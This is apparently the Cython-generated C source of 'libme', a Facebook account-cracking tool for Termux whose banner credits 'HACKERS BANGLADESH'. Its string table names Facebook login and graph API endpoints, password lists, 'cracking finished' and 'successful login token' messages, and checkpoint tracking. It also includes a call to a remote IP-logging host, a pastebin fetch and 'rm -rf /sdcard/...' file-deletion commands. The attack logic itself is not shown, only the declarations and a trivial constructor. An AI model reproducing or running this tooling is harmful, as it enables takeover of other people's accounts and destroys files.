static PyObject *__pyx_n_s_a;
static PyObject *__pyx_n_s_accept;
static PyObject *__pyx_kp_s_accept_encoding;
static PyObject *__pyx_kp_s_accept_language;
static PyObject *__pyx_kp_s_access_token;
static PyObject *__pyx_n_s_actor;
static PyObject *__pyx_kp_s_am_start_https_wa_me_96598064347;
static PyObject *__pyx_n_s_api;
static PyObject *__pyx_n_s_apii;
static PyObject *__pyx_n_s_apikey;
static PyObject *__pyx_kp_s_apikey___log;
static PyObject *__pyx_n_s_append;
static PyObject *__pyx_kp_s_application_x_www_form_urlencode;
static PyObject *__pyx_n_s_ask;
static PyObject *__pyx_n_s_b;
static PyObject *__pyx_n_s_bapi;
static PyObject *__pyx_n_s_base64;
static PyObject *__pyx_n_s_bl;
static PyObject *__pyx_n_s_bot__follow;
static PyObject *__pyx_n_s_bs4;
static PyObject *__pyx_n_s_bu;
static PyObject *__pyx_n_s_bulan;
static PyObject *__pyx_n_s_bulan_ttl;
static PyObject *__pyx_n_s_c_user;
static PyObject *__pyx_kp_s_cache_control;
static PyObject *__pyx_n_s_calendar;
static PyObject *__pyx_kp_s_cell_CTRadioAccessTechnologyHSDP;
static PyObject *__pyx_n_s_checkpoint;
static PyObject *__pyx_n_s_choice;
static PyObject *__pyx_n_s_choose;
static PyObject *__pyx_n_s_clear;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_close;
static PyObject *__pyx_n_s_coeg;
static PyObject *__pyx_n_s_comment;
static PyObject *__pyx_n_s_concurrent;
static PyObject *__pyx_n_s_concurrent_futures;
static PyObject *__pyx_n_s_confirm;
static PyObject *__pyx_kp_s_content_type;
static PyObject *__pyx_n_s_cookies;
static PyObject *__pyx_n_s_cp;
static PyObject *__pyx_kp_s_cracking_finished;
static PyObject *__pyx_kp_s_credentials_type_device_based_l;
static PyObject *__pyx_n_s_ct;
static PyObject *__pyx_n_s_cuid;
static PyObject *__pyx_n_s_current;
static PyObject *__pyx_n_s_data;
static PyObject *__pyx_n_s_date;
static PyObject *__pyx_n_s_datetime;
static PyObject *__pyx_n_s_day;
static PyObject *__pyx_n_s_day_name;
static PyObject *__pyx_kp_s_dev_null;
static PyObject *__pyx_n_s_doc;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_s_email;
static PyObject *__pyx_n_s_end;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_n_s_error_msg;
static PyObject *__pyx_n_s_ex;
static PyObject *__pyx_n_s_exceptions;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_exit_2;
static PyObject *__pyx_n_s_expired;
static PyObject *__pyx_kp_s_expired_tokens;
static PyObject *__pyx_n_s_f_james;
static PyObject *__pyx_n_s_false;
static PyObject *__pyx_n_s_fb;
static PyObject *__pyx_n_s_fb2;
static PyObject *__pyx_n_s_fb3;
static PyObject *__pyx_n_s_fb4;
static PyObject *__pyx_n_s_fb_noscript;
static PyObject *__pyx_n_s_file;
static PyObject *__pyx_n_s_file_2;
static PyObject *__pyx_n_s_file_3;
static PyObject *__pyx_n_s_file_4;
static PyObject *__pyx_n_s_findall;
static PyObject *__pyx_n_s_first_prefill_source;
static PyObject *__pyx_n_s_first_prefill_type;
static PyObject *__pyx_n_s_flush;
static PyObject *__pyx_n_s_friends;
static PyObject *__pyx_n_s_ft;
static PyObject *__pyx_n_s_gaaa;
static PyObject *__pyx_n_s_get;
static PyObject *__pyx_n_s_get_dict;
static PyObject *__pyx_n_s_getpass;
static PyObject *__pyx_kp_s_git_pull;
static PyObject *__pyx_kp_s_gzip_deflate;
static PyObject *__pyx_n_s_ha;
static PyObject *__pyx_n_s_had_cp_prefilled;
static PyObject *__pyx_n_s_had_password_prefilled;
static PyObject *__pyx_n_s_hashlib;
static PyObject *__pyx_n_s_headers;
static PyObject *__pyx_n_s_hex;
static PyObject *__pyx_n_s_home;
static PyObject *__pyx_n_s_host;
static PyObject *__pyx_n_s_hr;
static PyObject *__pyx_kp_s_html_parser;
static PyObject *__pyx_kp_s_https_api_asutoolkit_cloudaccess;
static PyObject *__pyx_kp_s_https_b_api_facebook_com_method;
static PyObject *__pyx_kp_s_https_free_facebook_com;
static PyObject *__pyx_kp_s_https_graph_facebook_com_1000070;
static PyObject *__pyx_kp_s_https_graph_facebook_com_2614119;
static PyObject *__pyx_kp_s_https_graph_facebook_com_2867565;
static PyObject *__pyx_kp_s_https_graph_facebook_com_2985411;
static PyObject *__pyx_kp_s_https_graph_facebook_com_3048075;
static PyObject *__pyx_kp_s_https_graph_facebook_com_me_acce;
static PyObject *__pyx_kp_s_https_graph_facebook_com_me_acce_2;
static PyObject *__pyx_kp_s_https_graph_facebook_com_s_field;
static PyObject *__pyx_kp_s_https_james_anggakurniawan_my_id;
static PyObject *__pyx_kp_s_https_mbasic_facebook_com;
static PyObject *__pyx_kp_s_https_mbasic_facebook_com_login;
static PyObject *__pyx_kp_s_https_pastebin_com_raw_2ivpYP20;
static PyObject *__pyx_n_s_hulu;
static PyObject *__pyx_n_s_i;
static PyObject *__pyx_n_s_ib;
static PyObject *__pyx_n_s_id;
static PyObject *__pyx_n_s_id1;
static PyObject *__pyx_n_s_id2;
static PyObject *__pyx_n_s_id_2;
static PyObject *__pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q;
static PyObject *__pyx_n_s_ids;
static PyObject *__pyx_n_s_idx;
static PyObject *__pyx_kp_s_if_no_result_turn_on_airplane_m;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_init;
static PyObject *__pyx_n_s_input;
static PyObject *__pyx_n_s_ip;
static PyObject *__pyx_n_s_is_smart_lock;
static PyObject *__pyx_n_s_items;
static PyObject *__pyx_n_s_james;
static PyObject *__pyx_kp_s_james_bs4_module_is_not_install;
static PyObject *__pyx_kp_s_james_futures_module_not_instal;
static PyObject *__pyx_kp_s_james_requests_module_is_not_in;
static PyObject *__pyx_n_s_jazoest;
static PyObject *__pyx_n_s_join;
static PyObject *__pyx_n_s_json;
static PyObject *__pyx_n_s_key;
static PyObject *__pyx_n_s_keys;
static PyObject *__pyx_n_s_kuki;
static PyObject *__pyx_n_s_kwargs;
static PyObject *__pyx_n_s_li;
static PyObject *__pyx_n_s_libme;
static PyObject *__pyx_kp_s_libme_pyx;
static PyObject *__pyx_n_s_limit;
static PyObject *__pyx_n_s_line;
static PyObject *__pyx_n_s_listpass;
static PyObject *__pyx_n_s_loads;
static PyObject *__pyx_n_s_login;
static PyObject *__pyx_n_s_login_2;
static PyObject *__pyx_kp_s_login_device_based_regular_logi;
static PyObject *__pyx_kp_s_login_next_ref_dbl_fl_refid_8;
static PyObject *__pyx_kp_s_login_next_ref_dbl_refid_8;
static PyObject *__pyx_kp_s_login_txt;
static PyObject *__pyx_n_s_loop;
static PyObject *__pyx_n_s_love;
static PyObject *__pyx_n_s_lower;
static PyObject *__pyx_n_s_lsd;
static PyObject *__pyx_n_s_lulu;
static PyObject *__pyx_n_s_m_ts;
static PyObject *__pyx_n_s_ma___sal2;
static PyObject *__pyx_n_s_ma__sal2;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_main_coeg;
static PyObject *__pyx_n_s_masal;
static PyObject *__pyx_n_s_masal2;
static PyObject *__pyx_kp_s_max_age_0;
static PyObject *__pyx_n_s_max_workers;
static PyObject *__pyx_n_s_me__nnn;
static PyObject *__pyx_n_s_member;
static PyObject *__pyx_n_s_menn;
static PyObject *__pyx_n_s_mennn;
static PyObject *__pyx_n_s_menu__file;
static PyObject *__pyx_n_s_menu_file;
static PyObject *__pyx_n_s_metaclass;
static PyObject *__pyx_n_s_method__1;
static PyObject *__pyx_n_s_method__2;
static PyObject *__pyx_n_s_mkdir;
static PyObject *__pyx_n_s_module;
static PyObject *__pyx_n_s_month;
static PyObject *__pyx_n_s_my_date;
static PyObject *__pyx_n_s_myfile;
static PyObject *__pyx_n_s_n;
static PyObject *__pyx_n_s_nTemp;
static PyObject *__pyx_n_s_nama;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_name_2;
static PyObject *__pyx_kp_s_noscript_1;
static PyObject *__pyx_n_s_now;
static PyObject *__pyx_n_s_ok;
static PyObject *__pyx_n_s_op;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_origin;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_p;
static PyObject *__pyx_n_s_parser;
static PyObject *__pyx_n_s_pass;
static PyObject *__pyx_kp_s_password;
static PyObject *__pyx_kp_s_password_minimum_6_characters;
static PyObject *__pyx_n_s_pastefile;
static PyObject *__pyx_kp_s_pip_install_bs4;
static PyObject *__pyx_kp_s_pip_install_futures;
static PyObject *__pyx_kp_s_pip_install_requests;
static PyObject *__pyx_n_s_post;
static PyObject *__pyx_n_s_prefill_contact_point;
static PyObject *__pyx_n_s_prefill_source;
static PyObject *__pyx_n_s_prefill_type;
static PyObject *__pyx_n_s_prepare;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_pw;
static PyObject *__pyx_n_s_pwx;
static PyObject *__pyx_n_s_qualname;
static PyObject *__pyx_n_s_r;
static PyObject *__pyx_n_s_randint;
static PyObject *__pyx_n_s_random;
static PyObject *__pyx_n_s_range;
static PyObject *__pyx_n_s_re;
static PyObject *__pyx_n_s_read;
static PyObject *__pyx_n_s_readlines;
static PyObject *__pyx_n_s_referer;
static PyObject *__pyx_n_s_replace;
static PyObject *__pyx_n_s_request;
static PyObject *__pyx_n_s_requests;
static PyObject *__pyx_n_s_response;
static PyObject *__pyx_n_s_rex;
static PyObject *__pyx_kp_s_rm_f_login_txt;
static PyObject *__pyx_kp_s_rm_rf_sdcard_1000_txt;
static PyObject *__pyx_kp_s_rm_rf_sdcard_100_txt;
static PyObject *__pyx_kp_s_rm_rf_sdcard_10_0_txt;
static PyObject *__pyx_kp_s_rm_rf_sdcard_f2_txt;
static PyObject *__pyx_kp_s_rm_rf_sdcard_f_2_txt;
static PyObject *__pyx_kp_s_s_s;
static PyObject *__pyx_kp_s_s_s_2;
static PyObject *__pyx_kp_s_s_s_3;
static PyObject *__pyx_kp_s_s_s_ok_s_cp_s;
static PyObject *__pyx_kp_s_s_s_s;
static PyObject *__pyx_kp_s_s_s_s_s;
static PyObject *__pyx_n_s_save;
static PyObject *__pyx_kp_s_sdcard;
static PyObject *__pyx_kp_s_sdcard_1000_txt;
static PyObject *__pyx_kp_s_sdcard_100_txt;
static PyObject *__pyx_kp_s_sdcard_10_0_txt;
static PyObject *__pyx_kp_s_sdcard_f2_txt;
static PyObject *__pyx_kp_s_sdcard_f_2_txt;
static PyObject *__pyx_n_s_self;
static PyObject *__pyx_n_s_ses;
static PyObject *__pyx_n_s_session_key;
static PyObject *__pyx_kp_s_sir_big_fan;
static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_start;
static PyObject *__pyx_n_s_status;
static PyObject *__pyx_n_s_stdout;
static PyObject *__pyx_kp_s_storage_emulated_0_1000_txt;
static PyObject *__pyx_kp_s_storage_emulated_0_100_txt;
static PyObject *__pyx_kp_s_storage_emulated_0_10_0_txt;
static PyObject *__pyx_kp_s_storage_emulated_0_f2_txt;
static PyObject *__pyx_kp_s_storage_emulated_0_f_2_txt;
static PyObject *__pyx_kp_s_storage_emulated_0_f__rindlist;
static PyObject *__pyx_n_s_strip;
static PyObject *__pyx_n_s_submit;
static PyObject *__pyx_n_s_subprocess;
static PyObject *__pyx_kp_s_successful_login_token;
static PyObject *__pyx_n_s_sys;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_t;
static PyObject *__pyx_n_s_ta;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_text;
static PyObject *__pyx_kp_s_text_html_application_xhtml_xml;
static PyObject *__pyx_n_s_threading;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_today;
static PyObject *__pyx_n_s_token;
static PyObject *__pyx_n_s_total;
static PyObject *__pyx_kp_s_touch_login_txt;
static PyObject *__pyx_n_s_true;
static PyObject *__pyx_n_s_try_number;
static PyObject *__pyx_n_s_ua;
static PyObject *__pyx_n_s_uid;
static PyObject *__pyx_n_s_unrecognized_tries;
static PyObject *__pyx_n_s_update;
static PyObject *__pyx_kp_s_upgrade_insecure_requests;
static PyObject *__pyx_n_s_upper;
static PyObject *__pyx_n_s_url;
static PyObject *__pyx_n_s_urllib;
static PyObject *__pyx_n_s_user;
static PyObject *__pyx_kp_s_user_agent;
static PyObject *__pyx_n_s_uuid;
static PyObject *__pyx_n_s_uuid4;
static PyObject *__pyx_n_s_value;
static PyObject *__pyx_n_s_w;
static PyObject *__pyx_n_s_weekday;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_kp_s_www_facebook_com;
static PyObject *__pyx_n_s_x;
static PyObject *__pyx_kp_s_x_fb_connection_bandwidth;
static PyObject *__pyx_kp_s_x_fb_connection_quality;
static PyObject *__pyx_kp_s_x_fb_connection_type;
static PyObject *__pyx_kp_s_x_fb_http_engine;
static PyObject *__pyx_kp_s_x_fb_net_hni;
static PyObject *__pyx_kp_s_x_fb_sim_hni;
static PyObject *__pyx_kp_s_xdg_open_https_youtube_com_chann;
static PyObject *__pyx_n_s_xo;
static PyObject *__pyx_n_s_xx;
static PyObject *__pyx_n_s_y;
static PyObject *__pyx_n_s_year;
static PyObject *__pyx_kp_s_you_are_not_registered;
static PyObject *__pyx_n_s_zx;
static PyObject *__pyx_pf_5libme_5James___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_2__request__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_4__start__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_6__fb__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_8__api__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx); /* proto */
static PyObject *__pyx_pf_5libme_5James_10__fb4__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_12__fb2__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_14__fb3__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_16__apii__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx); /* proto */
static PyObject *__pyx_pf_5libme_5James_18__login__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_20__bot__follow__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_22__menu__file__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_24__method__2__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_26__masal__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_28__1000__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_30__masal2__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_32__Frr__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_34__menn__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_36__bapi__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx); /* proto */
static PyObject *__pyx_pf_5libme_5James_38__method__1__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_40__10007__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_42__10000__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_44__ma__sal2__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_46__Frrr__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_48__mennn__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_50__file__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx); /* proto */
static PyObject *__pyx_pf_5libme_5James_52__33__3__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_54__100__07__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_56__100__00__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_58__ma___sal2__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_60__Fr__rr__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_62__me__nnn__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_5libme_5James_64__f_james__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx); /* proto */
static PyObject *__pyx_pf_5libme_5James_66main_coeg(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static __Pyx_CachedCFunction __pyx_umethod_PyDict_Type_update = {0, &__pyx_n_s_update, 0, 0, 0};
static PyObject *__pyx_float_20000000_0;
static PyObject *__pyx_float_30000000_0;
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_6;
static PyObject *__pyx_int_10;
static PyObject *__pyx_int_12;
static PyObject *__pyx_int_15;
static PyObject *__pyx_int_30;
static PyObject *__pyx_int_20000;
static PyObject *__pyx_int_40000;
static PyObject *__pyx_tuple__2;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__4;
static PyObject *__pyx_tuple__5;
static PyObject *__pyx_tuple__6;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_tuple__8;
static PyObject *__pyx_tuple__9;
static PyObject *__pyx_slice__37;
static PyObject *__pyx_slice__65;
static PyObject *__pyx_slice__66;
static PyObject *__pyx_tuple__10;
static PyObject *__pyx_tuple__11;
static PyObject *__pyx_tuple__13;
static PyObject *__pyx_tuple__14;
static PyObject *__pyx_tuple__15;
static PyObject *__pyx_tuple__16;
static PyObject *__pyx_tuple__17;
static PyObject *__pyx_tuple__18;
static PyObject *__pyx_tuple__19;
static PyObject *__pyx_tuple__20;
static PyObject *__pyx_tuple__21;
static PyObject *__pyx_tuple__22;
static PyObject *__pyx_tuple__23;
static PyObject *__pyx_tuple__24;
static PyObject *__pyx_tuple__25;
static PyObject *__pyx_tuple__26;
static PyObject *__pyx_tuple__27;
static PyObject *__pyx_tuple__29;
static PyObject *__pyx_tuple__30;
static PyObject *__pyx_tuple__31;
static PyObject *__pyx_tuple__32;
static PyObject *__pyx_tuple__33;
static PyObject *__pyx_tuple__34;
static PyObject *__pyx_tuple__35;
static PyObject *__pyx_tuple__36;
static PyObject *__pyx_tuple__40;
static PyObject *__pyx_tuple__41;
static PyObject *__pyx_tuple__42;
static PyObject *__pyx_tuple__44;
static PyObject *__pyx_tuple__45;
static PyObject *__pyx_tuple__46;
static PyObject *__pyx_tuple__47;
static PyObject *__pyx_tuple__48;
static PyObject *__pyx_tuple__49;
static PyObject *__pyx_tuple__50;
static PyObject *__pyx_tuple__51;
static PyObject *__pyx_tuple__52;
static PyObject *__pyx_tuple__53;
static PyObject *__pyx_tuple__54;
static PyObject *__pyx_tuple__57;
static PyObject *__pyx_tuple__58;
static PyObject *__pyx_tuple__59;
static PyObject *__pyx_tuple__60;
static PyObject *__pyx_tuple__61;
static PyObject *__pyx_tuple__62;
static PyObject *__pyx_tuple__63;
static PyObject *__pyx_tuple__67;
static PyObject *__pyx_tuple__69;
static PyObject *__pyx_tuple__71;
static PyObject *__pyx_tuple__73;
static PyObject *__pyx_tuple__75;
static PyObject *__pyx_tuple__77;
static PyObject *__pyx_tuple__79;
static PyObject *__pyx_tuple__81;
static PyObject *__pyx_tuple__83;
static PyObject *__pyx_tuple__85;
static PyObject *__pyx_tuple__87;
static PyObject *__pyx_tuple__89;
static PyObject *__pyx_tuple__91;
static PyObject *__pyx_tuple__93;
static PyObject *__pyx_tuple__95;
static PyObject *__pyx_tuple__98;
static PyObject *__pyx_tuple__100;
static PyObject *__pyx_tuple__102;
static PyObject *__pyx_tuple__104;
static PyObject *__pyx_tuple__106;
static PyObject *__pyx_tuple__108;
static PyObject *__pyx_tuple__110;
static PyObject *__pyx_tuple__113;
static PyObject *__pyx_tuple__115;
static PyObject *__pyx_tuple__117;
static PyObject *__pyx_tuple__119;
static PyObject *__pyx_tuple__121;
static PyObject *__pyx_tuple__123;
static PyObject *__pyx_tuple__125;
static PyObject *__pyx_tuple__127;
static PyObject *__pyx_tuple__129;
static PyObject *__pyx_tuple__131;
static PyObject *__pyx_tuple__133;
static PyObject *__pyx_codeobj__64;
static PyObject *__pyx_codeobj__70;
static PyObject *__pyx_codeobj__72;
static PyObject *__pyx_codeobj__74;
static PyObject *__pyx_codeobj__76;
static PyObject *__pyx_codeobj__78;
static PyObject *__pyx_codeobj__80;
static PyObject *__pyx_codeobj__82;
static PyObject *__pyx_codeobj__84;
static PyObject *__pyx_codeobj__86;
static PyObject *__pyx_codeobj__88;
static PyObject *__pyx_codeobj__90;
static PyObject *__pyx_codeobj__92;
static PyObject *__pyx_codeobj__94;
static PyObject *__pyx_codeobj__96;
static PyObject *__pyx_codeobj__99;
static PyObject *__pyx_codeobj__101;
static PyObject *__pyx_codeobj__103;
static PyObject *__pyx_codeobj__105;
static PyObject *__pyx_codeobj__107;
static PyObject *__pyx_codeobj__109;
static PyObject *__pyx_codeobj__111;
static PyObject *__pyx_codeobj__114;
static PyObject *__pyx_codeobj__116;
static PyObject *__pyx_codeobj__118;
static PyObject *__pyx_codeobj__120;
static PyObject *__pyx_codeobj__122;
static PyObject *__pyx_codeobj__124;
static PyObject *__pyx_codeobj__126;
static PyObject *__pyx_codeobj__128;
static PyObject *__pyx_codeobj__130;
static PyObject *__pyx_codeobj__132;
static PyObject *__pyx_codeobj__134;
static PyObject *__pyx_codeobj__135;
/* Late includes */

/* "libme.pyx":62
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 * class James:
 * 	def __init__(self):             # <<<<<<<<<<<<<<
 * 		self.id = []
 * 		self.ok = []
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_1__init__ = {"__init__", (PyCFunction)__pyx_pw_5libme_5James_1__init__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__init__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James___init__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__init__", 0);

  /* "libme.pyx":63
 * class James:
 * 	def __init__(self):
 * 		self.id = []             # <<<<<<<<<<<<<<
 * 		self.ok = []
 * 		self.cp = []
 */
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_id, __pyx_t_1) < 0) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":64
 * 	def __init__(self):
 * 		self.id = []
 * 		self.ok = []             # <<<<<<<<<<<<<<
 * 		self.cp = []
 * 		self.loop = 0
 */
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_ok, __pyx_t_1) < 0) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":65
 * 		self.id = []
 * 		self.ok = []
 * 		self.cp = []             # <<<<<<<<<<<<<<
 * 		self.loop = 0
 * 	try:
 */
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_cp, __pyx_t_1) < 0) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":66
 * 		self.ok = []
 * 		self.cp = []
 * 		self.loop = 0             # <<<<<<<<<<<<<<
 * 	try:
 * 		key = open(".__apikey__.log", "r").read()
 */
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_int_0) < 0) __PYX_ERR(0, 66, __pyx_L1_error)

  /* "libme.pyx":62
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 * class James:
 * 	def __init__(self):             # <<<<<<<<<<<<<<
 * 		self.id = []
 * 		self.ok = []
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_AddTraceback("libme.James.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":74
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")
 * 
 * 	def __request__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_3__request__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_3__request__ = {"__request__", (PyCFunction)__pyx_pw_5libme_5James_3__request__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_3__request__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__request__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_2__request__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_2__request__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_xx = NULL;
  PyObject *__pyx_v_lulu = NULL;
  PyObject *__pyx_v_hulu = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
